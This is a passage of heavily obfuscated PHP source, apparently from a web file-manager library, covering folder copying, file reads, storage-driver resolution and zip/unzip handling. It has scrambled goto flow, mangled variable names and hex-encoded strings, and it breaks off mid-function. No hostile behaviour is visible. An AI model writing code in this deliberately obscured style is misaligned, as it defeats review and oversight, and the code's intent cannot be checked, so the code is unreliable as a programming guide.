if ($EÒ•·áñæ != $F‹‚Â¿ä) { return !1; } if ($EÒ•·áñæ == $CÊÜÄİ˜[694]) { return !0; } if ($EÒ•·áñæ == $CÊÜÄİ˜[103]) { return !0; } goto C“Ö›İø÷­; b‘àˆöô®‚: $CÊÜÄİ˜ =& $_SERVER[¢à]; $EÒ•·áñæ = $a®ÒÄÁ×ó->getType(); $F‹‚Â¿ä = $BØçê‡ƒÄ->getType(); goto C×İœ†½µì; C“Ö›İø÷­: if ($a®ÒÄÁ×ó->pathDriver == $BØçê‡ƒÄ->pathDriver) { return !0; } return !1; goto cĞ©İÑ¨¸¸; cĞ©İÑ¨¸¸: } public static function copyUpdate($B½Š¿¾„ÇÀ, $BÓ¶·…æÛÊ) { goto f²ˆ‰¬ËÌ…; aµæÀÓ²ÜØ: $Còò…ÔÈîÂ = array(); foreach ($Aùöò¶„ as $F² ÏŒÖİ => $B–ğ„ïĞÊî) { if (isset($A¼˜ì ¦®´[$F² ÏŒÖİ])) { if ($B–ğ„ïĞÊî[$CÀóİ¼–Òä[76]] == 1) { continue; } if ($A¼˜ì ¦®´[$F² ÏŒÖİ][$CÀóİ¼–Òä[77]] == $B–ğ„ïĞÊî[$CÀóİ¼–Òä[77]]) { continue; } } if ($B–ğ„ïĞÊî[$CÀóİ¼–Òä[76]] == 1) { $Còò…ÔÈîÂ[] = $BÓ¶·…æÛÊ . $CÀóİ¼–Òä[8] . $F² ÏŒÖİ; continue; } $e¾êÜ¬˜¸ª = strstr(trim($F² ÏŒÖİ, $CÀóİ¼–Òä[8]), $CÀóİ¼–Òä[8]) ? get_path_father($F² ÏŒÖİ) : $CÀóİ¼–Òä[33]; $B£‰¸°µö[] = array($CÀóİ¼–Òä[1002] => $B–ğ„ïĞÊî[$CÀóİ¼–Òä[75]], $CÀóİ¼–Òä[1003] => rtrim($BÓ¶·…æÛÊ, $CÀóİ¼–Òä[8]) . $CÀóİ¼–Òä[8] . $e¾êÜ¬˜¸ª, $CÀóİ¼–Òä[1004] => $B–ğ„ïĞÊî); } $DÛš’ŠÄ¤È = array($CÀóİ¼–Òä[164] => $B£‰¸°µö, $CÀóİ¼–Òä[76] => $Còò…ÔÈîÂ); goto e¹ñ³‚Æâµ; f²ˆ‰¬ËÌ…: $CÀóİ¼–Òä =& $_SERVER[¢à]; if (!IO::exist($B½Š¿¾„ÇÀ)) { return !1; } if (!IO::exist($BÓ¶·…æÛÊ)) { IO::mkdir($BÓ¶·…æÛÊ); } goto B Ìœ¶¿Ä; B Ìœ¶¿Ä: $Aùöò¶„ = self::_listAll($B½Š¿¾„ÇÀ); $A¼˜ì ¦®´ = self::_listAll($BÓ¶·…æÛÊ); $B£‰¸°µö = array(); goto aµæÀÓ²ÜØ; e¹ñ³‚Æâµ: Hook::trigger($CÀóİ¼–Òä[1005], $B½Š¿¾„ÇÀ, $BÓ¶·…æÛÊ, $DÛš’ŠÄ¤È); foreach ($Còò…ÔÈîÂ as $B–ğ„ïĞÊî) { IO::mkdir($B–ğ„ïĞÊî); } foreach ($B£‰¸°µö as $B–ğ„ïĞÊî) { IO::copy($B–ğ„ïĞÊî[$CÀóİ¼–Òä[1002]], $B–ğ„ïĞÊî[$CÀóİ¼–Òä[1003]], REPEAT_REPLACE); } goto Dï®Ÿ‘†³‰; Dï®Ÿ‘†³‰: } private static function _listAll($E˜Ó±“ˆõ) { $C¤””ä’‰ =& $_SERVER[¢à]; $E˜Ó±“ˆõ = KodIO::clear($E˜Ó±“ˆõ); $CËÜä«ïÜ± = IO::listAll($E˜Ó±“ˆõ); foreach ($CËÜä«ïÜ± as &$A‰¦ÊŒŠÛã) { $dÙˆÂÖ¥ñ = substr($A‰¦ÊŒŠÛã[$C¤””ä’‰[75]], strlen($E˜Ó±“ˆõ)); $A‰¦ÊŒŠÛã[$C¤””ä’‰[1006]] = trim($dÙˆÂÖ¥ñ, $C¤””ä’‰[8]); } return array_to_keyvalue($CËÜä«ïÜ±, $C¤””ä’‰[1006]); } public static function fileSubstr($fÊ¿×°ášÀ, $f›÷ÚŒÚ÷œ, $dÍÈ›‰½›÷ = false) { goto bÕÇ›‚‹¼Ñ; a½áåÓ¼¾—: if ($f›÷ÚŒÚ÷œ + $dÍÈ›‰½›÷ > $AÛ†‹²¯¬à) { $dÍÈ›‰½›÷ = $AÛ†‹²¯¬à - $f›÷ÚŒÚ÷œ; } if ($dÍÈ›‰½›÷ <= 0) { return $_SERVER[¢à][33]; } if ($f›÷ÚŒÚ÷œ < 0 || $f›÷ÚŒÚ÷œ >= $AÛ†‹²¯¬à || $dÍÈ›‰½›÷ > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\145\x52\145\x61\144\40\145\162\x72\157\162\x21\x20\x73\x74\141\x72\164\75{$f›÷ÚŒÚ÷œ}\73\x6c\x65\156\x67\164\x68\75{$dÍÈ›‰½›÷}\73\x20\x73\151\x7a\x65\75{$AÛ†‹²¯¬à}\x3b"); } goto d°‰ˆ¶ñ‚‚; d°‰ˆ¶ñ‚‚: return $d®¨ã…×À->fileSubstr($fÊ¿×°ášÀ, $f›÷ÚŒÚ÷œ, $dÍÈ›‰½›÷); goto fƒæŒ¢¾„¯; DÜÇ†¿Ä†Î: $a¥‹ù¯ƒù = $dÍÈ›‰½›÷; if ($f›÷ÚŒÚ÷œ < 0) { $f›÷ÚŒÚ÷œ = $AÛ†‹²¯¬à + $f›÷ÚŒÚ÷œ; } if ($dÍÈ›‰½›÷ === !1) { $dÍÈ›‰½›÷ = $AÛ†‹²¯¬à - $f›÷ÚŒÚ÷œ; } goto a½áåÓ¼¾—; bÕÇ›‚‹¼Ñ: $d®¨ã…×À = self::driverMake($fÊ¿×°ášÀ); $AÛ†‹²¯¬à = $d®¨ã…×À->size($fÊ¿×°ášÀ); $B“ºŸâªˆ = $f›÷ÚŒÚ÷œ; goto DÜÇ†¿Ä†Î; fƒæŒ¢¾„¯: } private static function driverMake(&$b…­¶àˆ“¥) { goto Câ™ª‚¶; Câ™ª‚¶: $EÚÄµ©Úçš =& $_SERVER[¢à]; $fªÙò‚Ğ›· = KodIO::parse($b…­¶àˆ“¥); if (!self::$driverListSystem) { $B®©±ÅÈíõ = Model($EÚÄµ©Úçš[704])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($B®©±ÅÈíõ, $EÚÄµ©Úçš[364]); } goto bªŒ¿ÙÍò; bªŒ¿ÙÍò: if ($fªÙò‚Ğ›·[$EÚÄµ©Úçš[29]] == KodIO::KOD_IO && !self::$driverListSystem[$fªÙò‚Ğ›·[$EÚÄµ©Úçš[364]]]) { return !1; } $b…­¶àˆ“¥ = $fªÙò‚Ğ›·[$EÚÄµ©Úçš[1007]]; $fôÚ²š•â = self::driverGet($fªÙò‚Ğ›·, $b…­¶àˆ“¥); goto cÀÛ×²¥ß¢; cÀÛ×²¥ß¢: return $fôÚ²š•â; goto D¿çÙ¨éƒ¶; D¿çÙ¨éƒ¶: } private static function driverGet($Bˆãî¹’›½, &$b•Õô×Ğ¨‘) { goto bªÚˆ¸ø; F˜©¦ó„¥‹: $aÕ‰ğÉò“Ã->path = $b•Õô×Ğ¨‘; return $aÕ‰ğÉò“Ã; goto féˆÒ¦Õ; bªÚˆ¸ø: $a“ÈÔ£©Å =& $_SERVER[¢à]; $E©à…›ğ°½ = $Bˆãî¹’›½[$a“ÈÔ£©Å[1008]]; $aùİŠŠŞˆ‚ = $Bˆãî¹’›½[$a“ÈÔ£©Å[364]]; goto dÆœ¦›ë ; B¸¾ïÚäó¼: if (isset($B’Á‰‰øÏ[$a“ÈÔ£©Å[6]][$a“ÈÔ£©Å[1020]])) { $aÕ‰ğÉò“Ã->pathBase = rtrim($B’Á‰‰øÏ[$a“ÈÔ£©Å[6]][$a“ÈÔ£©Å[1020]], $a“ÈÔ£©Å[8]) . $a“ÈÔ£©Å[8]; $b•Õô×Ğ¨‘ = $aÕ‰ğÉò“Ã->pathBase . ltrim($b•Õô×Ğ¨‘, $a“ÈÔ£©Å[8]); } $b•Õô×Ğ¨‘ = $aÕ‰ğÉò“Ã->getPath($b•Õô×Ğ¨‘); if (isset($Bˆãî¹’›½[$a“ÈÔ£©Å[994]])) { $b•Õô×Ğ¨‘ = $Bˆãî¹’›½[$a“ÈÔ£©Å[994]]; } goto F˜©¦ó„¥‹; a”êğ»Ê: $aÕ‰ğÉò“Ã = self::$driverCache[$BÓøó«Ëâ]; $aÕ‰ğÉò“Ã->pathDriver = $E©à…›ğ°½; $aÕ‰ğÉò“Ã->pathBase = $a“ÈÔ£©Å[33]; goto B¸¾ïÚäó¼; dÆœ¦›ë : switch ($Bˆãî¹’›½[$a“ÈÔ£©Å[29]]) { case KodIO::KOD_IO: $B’Á‰‰øÏ = self::$driverListSystem[$aùİŠŠŞˆ‚]; break; case KodIO::KOD_SOURCE: $b•Õô×Ğ¨‘ = $aùİŠŠŞˆ‚ . $b•Õô×Ğ¨‘; $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1010], $a“ÈÔ£©Å[6] => $Bˆãî¹’›½); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $f±Šñ‚°‹ = $GLOBALS[$a“ÈÔ£©Å[1011]]; self::$driverListUser = array_to_keyvalue($f±Šñ‚°‹, $a“ÈÔ£©Å[364]); } $B’Á‰‰øÏ = self::$driverListUser[$aùİŠŠŞˆ‚]; break; case KodIO::KOD_SHARE_LINK: $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1012], $a“ÈÔ£©Å[6] => $Bˆãî¹’›½); $Eˆ²­¿ï—Å = Action($a“ÈÔ£©Å[1013])->sharePathInfo($Bˆãî¹’›½[$a“ÈÔ£©Å[75]]); $b•Õô×Ğ¨‘ = $Eˆ²­¿ï—Å[$a“ÈÔ£©Å[366]]; if (!$Eˆ²­¿ï—Å[$a“ÈÔ£©Å[366]]) { $EãÂÜğî­ô = Model($a“ÈÔ£©Å[532])->getInfo($Eˆ²­¿ï—Å[$a“ÈÔ£©Å[437]]); $b•Õô×Ğ¨‘ = KodIO::clear($EãÂÜğî­ô[$a“ÈÔ£©Å[1014]] . $Bˆãî¹’›½[$a“ÈÔ£©Å[1007]]); $Bˆãî¹’›½[$a“ÈÔ£©Å[435]] = $EãÂÜğî­ô; $Bˆãî¹’›½[$a“ÈÔ£©Å[994]] = $b•Õô×Ğ¨‘; $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1015], $a“ÈÔ£©Å[6] => $Bˆãî¹’›½); } break; case KodIO::KOD_SHARE_ITEM: $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1016], $a“ÈÔ£©Å[6] => $Bˆãî¹’›½); $EãÂÜğî­ô = Model($a“ÈÔ£©Å[532])->getInfo($Bˆãî¹’›½[$a“ÈÔ£©Å[364]]); if ($EãÂÜğî­ô[$a“ÈÔ£©Å[366]] == $a“ÈÔ£©Å[464]) { $b•Õô×Ğ¨‘ = KodIO::clear($EãÂÜğî­ô[$a“ÈÔ£©Å[1014]] . $Bˆãî¹’›½[$a“ÈÔ£©Å[1007]]); $Bˆãî¹’›½[$a“ÈÔ£©Å[435]] = $EãÂÜğî­ô; $Bˆãî¹’›½[$a“ÈÔ£©Å[994]] = $b•Õô×Ğ¨‘; $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1017], $a“ÈÔ£©Å[6] => $Bˆãî¹’›½); } break; default: $b•Õô×Ğ¨‘ = $Bˆãî¹’›½[$a“ÈÔ£©Å[75]]; $B’Á‰‰øÏ = array($a“ÈÔ£©Å[1009] => $a“ÈÔ£©Å[1018]); break; } $BÓøó«Ëâ = $Bˆãî¹’›½[$a“ÈÔ£©Å[75]]; if (!isset(self::$driverCache[$BÓøó«Ëâ])) { $d“ÄÏàÃ­ = strtolower($B’Á‰‰øÏ[$a“ÈÔ£©Å[90]]); $CÜØÊç¦¿ = $GLOBALS[$a“ÈÔ£©Å[6]][$a“ÈÔ£©Å[84]][$a“ÈÔ£©Å[1019]]; $DŠ×¸ÒŸ¡† = $a“ÈÔ£©Å[71] . (isset($CÜØÊç¦¿[$d“ÄÏàÃ­]) ? $CÜØÊç¦¿[$d“ÄÏàÃ­] : ucfirst($d“ÄÏàÃ­)); if (!class_exists($DŠ×¸ÒŸ¡†)) { show_json("{$DŠ×¸ÒŸ¡†}\x20\156\x6f\x74\40\145\x78\151\x73\164\x73\41", !1); } $cÆè–É›åˆ = isset($B’Á‰‰øÏ[$a“ÈÔ£©Å[6]]) ? $B’Á‰‰øÏ[$a“ÈÔ£©Å[6]] : !1; self::$driverCache[$BÓøó«Ëâ] = new $DŠ×¸ÒŸ¡†($cÆè–É›åˆ); } goto a”êğ»Ê; féˆÒ¦Õ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $aÏ¯ä¨ø²; if (!$aÏ¯ä¨ø²) { $E—ÄÀØœ² = IO::init($_SERVER[¢à][8]); } return $E—ÄÀØœ²; } private static function iconvSystem($b—îæ‡™á) { return self::local()->iconvSystem($b—îæ‡™á); } private static function iconvApp($CÜæèô·Ò) { return self::local()->iconvApp($CÜæèô·Ò); } public static function zip($a‘¡¬§ËîÇ, $e×ÚÏáÕò¹ = "\x7a\x69\160", $bÊîÁÇ·¼ = '', $B¬ÄùÅãŒƒ = REPEAT_RENAME) { goto AÑå”•÷ÜŸ; BÚŒÕçÏ Ò: if ($bÊîÁÇ·¼ || !$Fè’Ú¯ÜŸ) { if ($Fè’Ú¯ÜŸ && strstr($Fè’Ú¯ÜŸ, TEMP_FILES)) { $E’¿ø¶­¶ = $eŒöàìÓ = array(); recursion_dir($D‰¹˜äÚË£, $E’¿ø¶­¶, $eŒöàìÓ, 0); foreach ($E’¿ø¶­¶ as $c¹££îÁÅ£) { del_dir($c¹££îÁÅ£); } foreach ($eŒöàìÓ as $fñ‚ÅÍ‹¯İ) { if ($fñ‚ÅÍ‹¯İ == $bù”á¬ºÔ) { continue; } del_file($fñ‚ÅÍ‹¯İ); } } return $dÏ“ŸÃùêñ; } $cØ§˜Şğ¶® = self::pathFather($câáßº¦Æ†[$AÚöÕÀÕ¸[75]]); $FŞÓ°šÔø· = self::move($dÏ“ŸÃùêñ, $cØ§˜Şğ¶®, $B¬ÄùÅãŒƒ); goto a¤½×¬ÒÛó; AÑå”•÷ÜŸ: $AÚöÕÀÕ¸ =& $_SERVER[¢à]; $aì¼ôŒ» = self::init($a‘¡¬§ËîÇ[0][$AÚöÕÀÕ¸[75]]); $câáßº¦Æ† = self::info($a‘¡¬§ËîÇ[0][$AÚöÕÀÕ¸[75]]); goto AÒÓ¿£ç”; AÒÓ¿£ç”: $Fè’Ú¯ÜŸ = !1; if (!$bÊîÁÇ·¼ && $aì¼ôŒ»->getType() == $AÚöÕÀÕ¸[103]) { $eŒöàìÓ = self::zipFileList($a‘¡¬§ËîÇ); } else { $Fè’Ú¯ÜŸ = $bÊîÁÇ·¼ ? $bÊîÁÇ·¼ : TEMP_FILES . $AÚöÕÀÕ¸[1021] . time() . rand_string(8) . $AÚöÕÀÕ¸[8]; mk_dir($Fè’Ú¯ÜŸ); $eŒöàìÓ = self::zipFileList($a‘¡¬§ËîÇ, $Fè’Ú¯ÜŸ); } $Dñóö–œ‡ñ = $câáßº¦Æ†[$AÚöÕÀÕ¸[28]]; goto BøÛßÙ†²Ö; eÏ†…—›Â : foreach ($eŒöàìÓ as $fİºÑòè»¦ => $EÒ“¥æìÜ‹) { $eŒöàìÓ[$fİºÑòè»¦] = self::iconvSystem($EÒ“¥æìÜ‹); } KodArchive::create($bù”á¬ºÔ, $eŒöàìÓ); if (!IO::exist($dÏ“ŸÃùêñ)) { if ($Fè’Ú¯ÜŸ) { del_dir($Fè’Ú¯ÜŸ); } show_json(LNG($AÚöÕÀÕ¸[1023]), !1); } goto BÚŒÕçÏ Ò; BÃ÷Š‚‰¬Ì: $dÏ“ŸÃùêñ = $D‰¹˜äÚË£ . $Dñóö–œ‡ñ . $AÚöÕÀÕ¸[93] . $e×ÚÏáÕò¹; $dÏ“ŸÃùêñ = get_filename_auto($dÏ“ŸÃùêñ, $AÚöÕÀÕ¸[33], $B¬ÄùÅãŒƒ); $bù”á¬ºÔ = self::iconvSystem($dÏ“ŸÃùêñ); goto eÏ†…—›Â ; a¤½×¬ÒÛó: if (!$FŞÓ°šÔø·) { del_dir($Fè’Ú¯ÜŸ); show_json(LNG($AÚöÕÀÕ¸[1023]), !1); } del_dir($Fè’Ú¯ÜŸ); return $FŞÓ°šÔø·; goto aˆ­³™§½Ä; BøÛßÙ†²Ö: if (count($eŒöàìÓ) > 1) { $Aİ¥ÂÜ§¨¤ = IO::info(IO::pathFather($câáßº¦Æ†[$AÚöÕÀÕ¸[75]])); $Dñóö–œ‡ñ = $Aİ¥ÂÜ§¨¤[$AÚöÕÀÕ¸[28]]; } $D‰¹˜äÚË£ = $Fè’Ú¯ÜŸ; if (!$D‰¹˜äÚË£) { $D‰¹˜äÚË£ = get_path_father($câáßº¦Æ†[$AÚöÕÀÕ¸[75]]); $aĞĞ°•Ü£¬ = IO::info($D‰¹˜äÚË£); if (!$aĞĞ°•Ü£¬[$AÚöÕÀÕ¸[186]]) { show_json(LNG($AÚöÕÀÕ¸[1022]), !1); } } goto BÃ÷Š‚‰¬Ì; aˆ­³™§½Ä: } public static function unzip($aï¬‹Æëœ, $BËƒÆç»‰” = "\x72\145\x70\154\141\x63\x65") { goto BÆÏçÌï‰–; Aåá£¼‚Â: mk_dir($cõÏ®Â†ÇÂ); $f²§ãÎƒ¢ = self::fileExt($f—Äé±“Ï·); $Cí®¾ùóÌ = $cõÏ®Â†ÇÂ . $DÄ¾Ü¹‹÷Ú[93] . $f²§ãÎƒ¢; goto C£×¿öùÌ–; BÆÏçÌï‰–: $DÄ¾Ü¹‹÷Ú =& $_SERVER[¢à]; $AÁ´µëí Š = $aï¬‹Æëœ[$DÄ¾Ü¹‹÷Ú[75]]; $dœÈÔ¶ÇÍ = $aï¬‹Æëœ[$DÄ¾Ü¹‹÷Ú[1024]]; goto Eî‰×ÃâÙº; C£×¿öùÌ–: if (!@file_exists(self::iconvSystem($Cí®¾ùóÌ))) { $AÕœ¨‘¿éÆ = self::localFilePath($AÁ´µëí Š, $f²§ãÎƒ¢); $Cí®¾ùóÌ = $AÕœ¨‘¿éÆ ? $AÕœ¨‘¿éÆ : parent::download($AÁ´µëí Š, $Cí®¾ùóÌ); } $Cí®¾ùóÌ = self::iconvSystem($Cí®¾ùóÌ); $A›Áœá¬Æ = isset($aï¬‹Æëœ[$DÄ¾Ü¹‹÷Ú[1026]]) ? $aï¬‹Æëœ[$DÄ¾Ü¹‹÷Ú[1026]] : $DÄ¾Ü¹‹÷Ú[1027]; goto Dë˜ç“ƒŒ; aœ¤¥åê: foreach ($Bœ‡§‘´ÈŒ as $e½Âµóé¢) { $e½Âµóé¢ = self::iconvApp($e½Âµóé¢); self::move($e½Âµóé¢, $dœÈÔ¶ÇÍ, $BËƒÆç»‰”); } del_dir($cõÏ®Â†ÇÂ); if (!$AÕœ¨‘¿éÆ) { del_file($Cí®¾ùóÌ); } goto F„âªàœ‹; Eî‰×ÃâÙº: if (!($f—Äé±“Ï· = parent::info($AÁ´µëí Š))) { show_json(LNG($DÄ¾Ü¹‹÷Ú[1025]), !1); } if (!($A‡ÓÚ–ô = parent::infoFull($dœÈÔ¶ÇÍ))) { $dœÈÔ¶ÇÍ = parent::mkdir($dœÈÔ¶ÇÍ); $A‡ÓÚ–ô = array($DÄ¾Ü¹‹÷Ú[75] => $dœÈÔ¶ÇÍ); } else { if (isset($A‡ÓÚ–ô[$DÄ¾Ü¹‹÷Ú[366]]) && trim($A‡ÓÚ–ô[$DÄ¾Ü¹‹÷Ú[75]], $DÄ¾Ü¹‹÷Ú[8]) != trim($dœÈÔ¶ÇÍ, $DÄ¾Ü¹‹÷Ú[8])) { $b«³“Úí„ = KodIO::make($A‡ÓÚ–ô[$DÄ¾Ü¹‹÷Ú[457]]); $e‹×Œñ”Í = parent::fileNameAuto($b«³“Úí„, $A‡ÓÚ–ô[$DÄ¾Ü¹‹÷Ú[28]], REPEAT_RENAME_FOLDER, !0); $dœÈÔ¶ÇÍ = parent::mkdir($b«³“Úí„ . $e‹×Œñ”Í); $A‡ÓÚ–ô = array($DÄ¾Ü¹‹÷Ú[75] => $dœÈÔ¶ÇÍ); } } $dœÈÔ¶ÇÍ = $A‡ÓÚ–ô[$DÄ¾Ü¹‹÷Ú[75]]; goto AãŒ†‡”¦¦; F„âªàœ‹: return !0; goto e·¿‘êÉõ; AãŒ†‡”¦¦: $CÚçÊ•‡¹ = self::tmpFileName($f—Äé±“Ï·); $cõÏ®Â†ÇÂ = TEMP_FILES . $CÚçÊ•‡¹; del_dir($cõÏ®Â†ÇÂ); goto Aåá£¼‚Â; BâåÊ™¥Ÿ»: Hook::trigger($DÄ¾Ü¹‹÷Ú[1031], $cõÏ®Â†ÇÂ); recursion_dir($cõÏ®Â†ÇÂ, $dŠ•£ÃºÒ›, $A—íÖ¾‰¿§, 0); $Bœ‡§‘´ÈŒ = array_merge($dŠ•£ÃºÒ›, $A—íÖ¾‰¿§); goto aœ¤¥åê; Dë˜ç“ƒŒ: $Fòí¾ÕÆ£ = KodArchive::extract($Cí®¾ùóÌ, $cõÏ®Â†ÇÂ . $DÄ¾Ü¹‹÷Ú[8], $A›Áœá¬Æ); self::archiveExt(); if (!$Fòí¾ÕÆ£[$DÄ¾Ü¹‹÷Ú[1028]]) { show_json($DÄ¾Ü¹‹÷Ú[1029] . $Fòí¾ÕÆ£[$DÄ¾Ü¹‹÷Ú[1030]], !1); } goto BâåÊ™¥Ÿ»; e·¿‘êÉõ: } public static function unzipList($Aõ®ÖÖ¡ˆä) { goto C„Œ»…ôÃë; c½ÀÄŞÍÉÅ: if (isset($B…„¬ÎÅˆ¹)) { $aˆ¹õ£­¶½ = array($B…„¬ÎÅˆ¹[$FØñÂîÃ›[75]], $B…„¬ÎÅˆ¹[$FØñÂîÃ›[1032]], $B…„¬ÎÅˆ¹[$FØñÂîÃ›[28]]); $a‘ì‹ã½‘Ş = md5(implode($FØñÂîÃ›[70], $aˆ¹õ£­¶½)) . $FØñÂîÃ›[93] . get_path_ext($B…„¬ÎÅˆ¹[$FØñÂîÃ›[28]]); } else { $aˆ¹õ£­¶½ = array($eŞ®Õ†„õ[$FØñÂîÃ›[28]], $eŞ®Õ†„õ[$FØñÂîÃ›[75]], $eŞ®Õ†„õ[$FØñÂîÃ›[77]]); $a‘ì‹ã½‘Ş = md5(implode($FØñÂîÃ›[70], $aˆ¹õ£­¶½)) . $FØñÂîÃ›[93] . $E˜íäĞ»‡ñ; } if ($CŒ·Ø¹¥¢Õ == -1) { $CŞ–¬Œ™¬‰ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\151\x65\x77\x2f{$F¦›Âˆ‡Å–}\57{$a‘ì‹ã½‘Ş}\x2e\x6c\x6f\x67"; $bÀ »¬«¶Ÿ = self::infoFull($CŞ–¬Œ™¬‰); if ($bÀ »¬«¶Ÿ) { $CŞ–¬Œ™¬‰ = $bÀ »¬«¶Ÿ[$FØñÂîÃ›[75]]; $EÙˆƒï÷Äó = self::getContent($CŞ–¬Œ™¬‰); if ($EÙˆƒï÷Äó) { $C®Óæ›«œù = json_decode($EÙˆƒï÷Äó, !0); if (count($C®Óæ›«œù) >= $e¦Õ‘Ì…±Õ) { show_json(sprintf(LNG($FØñÂîÃ›[1034]), count($C®Óæ›«œù)), !1); } return $C®Óæ›«œù; } } else { $CŞ–¬Œ™¬‰ = self::mkfile($CŞ–¬Œ™¬‰); } } $f¡Ş·î¿À¿ = TEMP_FILES . $F¦›Âˆ‡Å–; goto dâˆäï¨éø; D¯ËÈ˜Ä¹„: $eŞ®Õ†„õ = self::info($EŸ’ ƒÃÅ–); $E˜íäĞ»‡ñ = self::fileExt($eŞ®Õ†„õ); $F¦›Âˆ‡Å– = self::tmpFileName($eŞ®Õ†„õ); goto c½ÀÄŞÍÉÅ; C„Œ»…ôÃë: $FØñÂîÃ› =& $_SERVER[¢à]; $c½‡ÛÂìÛÏ = $Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[75]]; $CŒ·Ø¹¥¢Õ = isset($Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[1032]]) ? $Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[1032]] : -1; goto cŒâ„êÔÉ; dâˆäï¨éø: if (!is_dir($f¡Ş·î¿À¿)) { mk_dir($f¡Ş·î¿À¿); } $F–‚‰“¶Æ™ = $f¡Ş·î¿À¿ . $FØñÂîÃ›[8] . $a‘ì‹ã½‘Ş; if (!@file_exists(self::iconvSystem($F–‚‰“¶Æ™))) { if (isset($B…„¬ÎÅˆ¹)) { url_request($c½‡ÛÂìÛÏ, $FØñÂîÃ›[1035], $F–‚‰“¶Æ™); } else { $A†‡ÕÀÈ×Ì = self::localFilePath($c½‡ÛÂìÛÏ, $E˜íäĞ»‡ñ); $F–‚‰“¶Æ™ = $A†‡ÕÀÈ×Ì ? $A†‡ÕÀÈ×Ì : self::download($c½‡ÛÂìÛÏ, $F–‚‰“¶Æ™); } } goto FË¸—ù˜ÄŒ; A­†ç“®Š»: self::archiveExt(); del_dir($f¡Ş·î¿À¿); if (!$eÁÎâÌ‡[$FØñÂîÃ›[1028]]) { show_json($eÁÎâÌ‡[$FØñÂîÃ›[1030]], !1); } goto aÌª«é»¤‘; FË¸—ù˜ÄŒ: $F–‚‰“¶Æ™ = self::iconvSystem($F–‚‰“¶Æ™); if ($CŒ·Ø¹¥¢Õ >= 0) { $AÛ¼Œåø›æ = isset($Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[1036]]) ? $Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[1036]] : !1; $dô“©Õ½ñ‘ = isset($Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[28]]) ? $Aõ®ÖÖ¡ˆä[$FØñÂîÃ›[28]] : $FØñÂîÃ›[33]; KodArchive::filePreview($F–‚‰“¶Æ™, $CŒ·Ø¹¥¢Õ, $AÛ¼Œåø›æ, $dô“©Õ½ñ‘); self::archiveExt(); die; } $eÁÎâÌ‡ = KodArchive::listContent($F–‚‰“¶Æ™); goto A­†ç“®Š»; EÈî½ƒŒÈ¨: return $eÁÎâÌ‡[$FØñÂîÃ›[1030]]; goto C»„ÈË–ªï; aÌª«é»¤‘: $C®Óæ›«œù = json_encode($eÁÎâÌ‡[$FØñÂîÃ›[1030]]); self::setContent($CŞ–¬Œ™¬‰, $C®Óæ›«œù); if (count($eÁÎâÌ‡[$FØñÂîÃ›[1030]]) >= $e¦Õ‘Ì…±Õ) { show_json(sprintf(LNG($FØñÂîÃ›[1034]), count($eÁÎâÌ‡[$FØñÂîÃ›[1030]])), !1); } goto EÈî½ƒŒÈ¨; cŒâ„êÔÉ: $e¦Õ‘Ì…±Õ = 50000; if (request_url_safe($c½‡ÛÂìÛÏ)) { $B…„¬ÎÅˆ¹ = parse_url_query($c½‡ÛÂìÛÏ); if (!isset($B…„¬ÎÅˆ¹[$FØñÂîÃ›[75]])) { show_json($FØñÂîÃ›[1033], !1); } } $EŸ’ ƒÃÅ– = isset($B…„¬ÎÅˆ¹) ? $B…„¬ÎÅˆ¹[$FØñÂîÃ›[75]] : $c½‡ÛÂìÛÏ; goto D¯ËÈ˜Ä¹„; C»„ÈË–ªï: } private static function fileExt($AÅƒÃÑÃÚ) { $cé¹Œ†¡‰ =& $_SERVER[¢à]; $DÚÔÎØ´¢Œ = $AÅƒÃÑÃÚ[$cé¹Œ†¡‰[157]]; if ($DÚÔÎØ´¢Œ == $cé¹Œ†¡‰[1037]) { $DİÈ‘‡Í×ï = $cé¹Œ†¡‰[1038]; if (substr($AÅƒÃÑÃÚ[$cé¹Œ†¡‰[28]], -strlen($DİÈ‘‡Í×ï)) == $DİÈ‘‡Í×ï) { $DÚÔÎØ´¢Œ = $cé¹Œ†¡‰[1039]; } } self::archiveExt($DÚÔÎØ´¢Œ); return $DÚÔÎØ´¢Œ; } private static function zipFileList($aôšÜšãœ, $B‡ŠÊ–›Õ = false) { $Bàñ‡£¹¬Š =& $_SERVER[¢à]; $c†ßÜŠ· = array(); foreach ($aôšÜšãœ as $f×É˜Äº°Ë) { $dÈÔñÌÉóß = $f×É˜Äº°Ë[$Bàñ‡£¹¬Š[75]]; if ($B‡ŠÊ–›Õ) { $dÈÔñÌÉóß = self::copy($f×É˜Äº°Ë[$Bàñ‡£¹¬Š[75]], $B‡ŠÊ–›Õ, $Bàñ‡£¹¬Š[744]); } if ($dÈÔñÌÉóß && self::local()->exist($dÈÔñÌÉóß)) { $c†ßÜŠ·[$f×É˜Äº°Ë[$Bàñ‡£¹¬Š[75]]] = $dÈÔñÌÉóß; } } if (!empty($c†ßÜŠ·)) { return array_values($c†ßÜŠ·); } show_json(LNG($Bàñ‡£¹¬Š[1040]), !1); } public static function tmpFileName($d÷è¸„·İ) { $aØÁºÕ¡È =& $_SERVER[¢à]; $B†ºó‘¬ß¼ = array($d÷è¸„·İ[$aØÁºÕ¡È[28]], $d÷è¸„·İ[$aØÁºÕ¡È[75]], $d÷è¸„·İ[$aØÁºÕ¡È[77]], $d÷è¸„·İ[$aØÁºÕ¡È[455]]); return md5(implode($aØÁºÕ¡È[70], $B†ºó‘¬ß¼)); } private static function localFilePath($eº”¶©‹Ú†, $bÚÜÓ˜•‹‚) { goto B³Ş‹Ÿå¡³; c¼åÓÔ¼ŸÛ: if ($A»ç‚†‚í[$D­‰¯™½œ‹[29]] == 